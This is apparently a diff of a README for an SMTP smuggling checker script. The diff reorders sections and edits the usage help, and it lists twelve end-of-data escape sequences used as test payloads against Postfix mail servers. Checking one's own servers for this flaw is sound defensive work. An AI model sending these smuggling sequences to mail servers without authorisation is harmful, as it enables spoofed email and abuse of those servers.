@@ -9,34 +9,6 @@ https://www.postfix.org/smtp-smuggling.html
 
 <hr>
 
-> [!NOTE]
-> ### Beware this is alpha POC !! tested with postfix and python3
-
-<hr>
-
-### Testing of postfix mailserver for example (localhost port 25 auth plain login(optinal)):
-![grafik](https://github.com/suuhm/smtp_smuggling_checker.py/assets/11504990/f46c47ed-8cd7-4395-9d2e-12589a505e21)
-
-
-#### Testing these 12 payload strings:
-```bash
-#Smgggling Strings (0-11):
-#smtp_smuggle_escape = '\r\n.\r'
-#smtp_smuggle_escape = '\r.\r'
-#smtp_smuggle_escape = '\r\n\x00.\r'
-#smtp_smuggle_escape = '\r\n\x00.\n'
-#smtp_smuggle_escape = \r\n\x00.\r\n
-#smtp_smuggle_escape = \r\n.\x00\r\n
-#smtp_smuggle_escape = '\r\n.'
-#smtp_smuggle_escape = \n.\r\n
-#smtp_smuggle_escape = \r.\r\n
-#smtp_smuggle_escape = \n\n.\r\n
-#smtp_smuggle_escape = \r\n.\r
-#smtp_smuggle_escape = \n.\n
-```
-
-<hr>
-
 ## How to use:
 
 ```python
@@ -58,14 +30,14 @@ options:
   -h, --help       show this help message and exit
   --server SERVER  SMTP-Servername DNS or IP
   --port PORT      SMTP-Serverport (Use 5870000 for 587 NOSSL)
-  --user USER      SMTP-userername
+  --user USER      SMTP-userername will automatically promts for pw
   --rcpt RCPT      rcpt address
   --mode MODE      Rawmode = raw or Default = def
+
 ```
 
-<hr>
 
-### Run the script like this:
+#### Run the script like this:
 
 ```bash
 # Example : You have to setup the Parameters with the right values!
@@ -74,6 +46,36 @@ options:
 ```
 
 <hr>
+
+> [!NOTE]
+> ### Beware this is alpha POC !! tested with postfix and python3
+>
+> 
+<hr>
+
+### Testing of postfix mailserver for example (localhost port 25 auth plain login (optional)):
+![grafik](https://github.com/suuhm/smtp_smuggling_checker.py/assets/11504990/f46c47ed-8cd7-4395-9d2e-12589a505e21)
+
+<hr>
+
+### Testing these 12 payload strings:
+##### Smgggling Strings (0-11):
+
+- 0 - smtp_smuggle_escape = '\r\n.\r'
+- 1 - smtp_smuggle_escape = '\r.\r'
+- 2 - smtp_smuggle_escape = '\r\n\x00.\r'
+- 3 - smtp_smuggle_escape = '\r\n\x00.\n'
+- 4 - smtp_smuggle_escape = \r\n\x00.\r\n
+- 5 - smtp_smuggle_escape = \r\n.\x00\r\n
+- 6 - smtp_smuggle_escape = '\r\n.'
+- 7 - smtp_smuggle_escape = \n.\r\n
+- 8 - smtp_smuggle_escape = \r.\r\n
+- 9 - smtp_smuggle_escape = \n\n.\r\n
+- 10 - smtp_smuggle_escape = \r\n.\r
+- 11 - smtp_smuggle_escape = \n.\n
+
+<hr>
+
 
 ### Using telnet / openssl client for TLS
 
